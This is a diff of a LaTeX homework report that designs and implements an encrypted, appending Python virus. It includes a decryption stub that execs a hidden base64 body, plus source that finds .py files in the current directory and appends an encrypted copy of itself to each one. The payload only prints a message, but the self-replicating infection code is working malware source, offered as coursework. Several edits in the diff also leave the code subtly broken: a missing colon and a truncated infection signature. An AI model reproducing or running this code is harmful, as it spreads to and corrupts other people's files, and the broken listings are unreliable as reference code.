@@ -57,17 +57,20 @@
 
 \section{Introduction}
 The purpose is to design a virus similar to the \textit{vbash} one, except that it will be encrypted. Its structure is divided in two parts:
-\begin{itemize}
+\begin{enumerate}
 \item The first part of the code will be unencrypted and will simply consist of the decryption function. The key will be made of the first bytes of the infected virus.
 \item The second part (the most important one) will consist of the main body of the virus.
-\end{itemize}
+\end{enumerate}
 The virus will be an appending one. It will spread as follows:
-\begin{itemize}
-\item It looks for infected is executed.
+\begin{enumerate}
+\item The decrypted routine retrieves the key from the infected file and decrypts the main body of the virus.
+\item Once decrypted, the virus is executed.
+\begin{enumerate}
+\item It looks for infected files.
 \item During the infection, it creates a specific key for each file (once again, a few bytes are taken from the target file), then encrypts its own main body and adds both the decrypting routine and the ( encrypted ) main viral body to the target file.
 \item A potential payload may be triggered ( with or without a delayed action mechanism).
-\end{itemize}
-
+\end{enumerate}
+\end{enumerate}
 \section{Virus design}
 We decide to write the homework assigned using the language Python.
 
@@ -79,9 +82,9 @@ The virus is divived in two principle parts:
 
 When the encrypted virus program body is decrypted and executed, it will do the following operations:
 \begin{itemize}
-\item search for potentially infectable file: the virus program body search for other Python script into the current directory;
-\item checks if the Python file is already infected: if so, skip the file and try with another one to prevent the over infection;
-\item infect the file: append to the target its own code composed, as the original virus, with the virus decryption routine and the encrypted virus program body, using the first line of the target as encryption key.
+\item search for potentially infectable file: the virus program body searches for others Python scripts into the current directory;
+\item check if the Python file is already infected: if so, skip the file and try with another one in order to prevent the over infection;
+\item infect the file: the main body of the virus appends, to the target,  its own code composed, as the original virus, with the virus decryption routine and the encrypted virus program body, using the first line of the target as encryption key.
 \end{itemize}
 
 The Figure \ref{fig:mission} shows graphically what it was explained above.
@@ -94,15 +97,19 @@ The Figure \ref{fig:mission} shows graphically what it was explained above.
 
 \section{Implementation}
 
-\begin{minted}[ mathescape, frame=lines]{python} 
+The code shown below corresponds to the virus decryption routine, whereas the second portion of code corresponds to the encrypted virus program body; note that the encrypted virus program body is already encrypted in the virus decryption routine, at line 23.
+
+\begin{minted}[mathescape,
+               linenos]{python}
 # Open the virus itself
 this = open(__main__.__file__, 'r')
 # Set copy variable to False
 copy = False
-# Initialize an empty payload
+# Initialize an empty string
 cipher_payload = ''
 
-# Search for the encrypted main body of the virus and copy it into cipher_payload
+# Search for the encrypted main body of the virus 
+# and copy it into cipher_payload
 for line in this:
    if line.strip() == '# Start payload':
       copy = True
@@ -116,21 +123,27 @@ exec e
 
 # Encrypted main body of the virus
 # Start payload
-#8eoDXnZwwdY/TUaf5IQOo5+tbvE2zllu4t0m...
+#NpvtmqJT43JyqT/ubKnOIohtnxVkmEl...
 # End payload
 \end{minted}
-
 
 \begin{minted}[mathescape,
                linenos]{python}
 import os
+# Function to check if a file is already infected
 def is_infected(filename):
+   # Open file
    f = open(filename, 'r')
+   # Read all lines
    lines = f.readlines()
+   # If the numbers of lines is less than 46 then the file is not infected
    if len(lines) < 46:
       return False
-   return lines[len(lines) - 46].startswith('######################################################## First script python')
+   # if the (lines minus 46)-th line starts with '######...# First script python'
+   #  then the file is infected; otherwise it's not infected
+   return lines[len(lines) - 46].startswith('######...# First script python')
 
+# Function to infect a file
 def infect(filename):
    # Rename the file as a temporary file
    os.rename(filename, filename + '-copy')
@@ -146,15 +159,16 @@ def infect(filename):
    # Copy the content of this file into the destination file
    for line in source:
       destination.write(line)
-   # Write the key
-   destination.write("\n######################################################## First script python\n")
+   # Write the signature
+   destination.write("\n################...# First script python\n")
    destination.write("# coding=utf-8\n")
    destination.write("# Start Unencrypted\n")
-   # Set the copy to False, unencrypted body not found yet
+   # Set copy to False, virus unencrypted body not found yet
    copy = False
    # Initialize result
    result = ''
-   # Copy the unencrypted payload into the new file only if the string '# Start Unencrypted'  is found
+   # Copy the unencrypted payload into the new file 
+   # only if the string '# Start Unencrypted'  is found
    for line in this:
       if line.strip() == '# Start Unencrypted':
          copy = True
@@ -163,9 +177,10 @@ def infect(filename):
          copy = False
       elif copy:
          destination.write(line);
-   # Write the malicious payload at the of file
+   # Write the malicious payload at the end of file
    destination.write("\n# Start payload\n")
    destination.write("#")
+   # Encrypt the body of virus with the first line of the target file
    destination.write(str(encrypt(e, filename)))
    destination.write("\n# End payload")
    # Remove the temporary copy of the file
@@ -173,6 +188,7 @@ def infect(filename):
    source.close()
    destination.close()
    this.close()
+   
 # Function to find and infect files in the current directory 
 def find_and_infect_files():
    path = '.'
@@ -181,11 +197,12 @@ def find_and_infect_files():
 
    # For each file try to infect it
    for filename in dirs:
-      # If file ends with .py, is not already infected and it's not virus itself (virus.py)
-      if filename.endswith('.py') and (not is_infected(filename)) and (filename != "virus.py"):
+      # If file ends with .py and it is not already infected 
+      if filename.endswith('.py') and (not is_infected(filename))
          print "Infected " +  str(filename)
          # Infect file with the virus
          infect(filename)
+         
 # Function to encrypt 
 def encrypt(data,filename):
    source = open(filename + '-copy', 'r')
@@ -199,10 +216,10 @@ def encrypt(data,filename):
    source.close()
    # Encode encrypted data in base64
    return base64.b64encode(encrypted)
- ####################
+
 # Malicious payload to execute
 def payload():
-   print "This file is infected infected! Mhuahauhauahau!"
+   print "This file is infected! Mhuahauhauahau!"
 
 # Find and infect files
 find_and_infect_files()
